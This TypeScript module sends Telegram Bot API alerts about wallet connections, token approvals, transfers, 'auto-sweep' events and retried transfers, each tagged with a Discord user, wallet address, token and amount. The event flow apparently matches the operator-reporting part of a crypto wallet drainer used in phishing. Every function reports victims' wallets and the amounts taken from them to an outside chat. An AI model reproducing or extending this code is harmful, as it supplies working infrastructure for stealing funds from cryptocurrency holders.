const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramMessage(text: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("[Telegram] Bot token or chat ID not configured, skipping notification");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const err = await response.text();
      console.error("[Telegram] Failed to send message:", err);
      return false;
    }

    return true;
  } catch (error: any) {
    console.error("[Telegram] Error sending message:", error?.message);
    return false;
  }
}

const TOKEN_ADDRESS_MAP: Record<string, string> = {
  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDC",
  "0x6b175474e89094c44da98b954eedeac495271d0f": "DAI",
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTC",
  "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": "WETH",
};

export function resolveTokenSymbol(tokenAddress: string): string {
  return TOKEN_ADDRESS_MAP[tokenAddress.toLowerCase()] || tokenAddress.slice(0, 10);
}

function shortenAddress(addr: string): string {
  if (!addr) return "Unknown";
  if (addr.length <= 12) return addr;
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

function getChainName(chainId: string | number): string {
  const chains: Record<string, string> = {
    "1": "Ethereum",
    "56": "BSC",
    "137": "Polygon",
    "42161": "Arbitrum",
    "10": "Optimism",
    "43114": "Avalanche",
    "8453": "Base",
  };
  return chains[String(chainId)] || `Chain ${chainId}`;
}

export async function notifyWalletConnected(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Wallet Connected</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}`;

  await sendTelegramMessage(msg);
}

export async function notifyWalletSigned(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  tokens: string[];
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, tokens, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Wallet Signed (Approval)</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Tokens:</b> ${tokens.join(", ")}`;

  await sendTelegramMessage(msg);
}

export async function notifyTransferSuccess(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  token: string;
  amount: string;
  txHash: string;
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, token, amount, txHash, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Transfer Successful</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Token:</b> ${token}\n` +
    `<b>Amount:</b> ${amount}\n` +
    `<b>TX:</b> <code>${txHash}</code>`;

  await sendTelegramMessage(msg);
}

export async function notifyTransferFailed(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  error: string;
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, error, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Transfer Failed</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Error:</b> ${error}`;

  await sendTelegramMessage(msg);
}

export async function notifySweepSuccess(params: {
  walletAddress: string;
  network: string;
  token: string;
  amount: string;
  txHash: string;
}) {
  const { walletAddress, network, token, amount, txHash } = params;
  const chain = network === "solana" ? "Solana" : "EVM";

  const msg =
    `<b>Auto-Sweep Successful</b>\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Token:</b> ${token}\n` +
    `<b>Amount:</b> ${amount}\n` +
    `<b>TX:</b> <code>${txHash}</code>`;

  await sendTelegramMessage(msg);
}

export async function notifyRetrySuccess(params: {
  walletAddress: string;
  chainId: string;
  txHash: string;
  attempt: number;
  tokens: { token: string; amount: string }[];
}) {
  const { walletAddress, chainId, txHash, attempt, tokens } = params;
  const chain = getChainName(chainId);
  const tokenList = tokens.map(t => `${t.token}: ${t.amount}`).join("\n");

  const msg =
    `<b>Retry Transfer Successful</b>\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Attempt:</b> #${attempt}\n` +
    `<b>TX:</b> <code>${txHash}</code>\n` +
    `<b>Tokens:</b>\n${tokenList}`;

  await sendTelegramMessage(msg);
}

export async function notifyRetryFailed(params: {
  walletAddress: string;
  chainId: string;
  attempt: number;
  error: string;
  maxRetriesExceeded?: boolean;
}) {
  const { walletAddress, chainId, attempt, error, maxRetriesExceeded } = params;
  const chain = getChainName(chainId);
  const status = maxRetriesExceeded ? "MAX RETRIES EXCEEDED" : "Retry Failed";

  const msg =
    `<b>${status}</b>\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Attempt:</b> #${attempt}\n` +
    `<b>Error:</b> ${error}`;

  await sendTelegramMessage(msg);
}
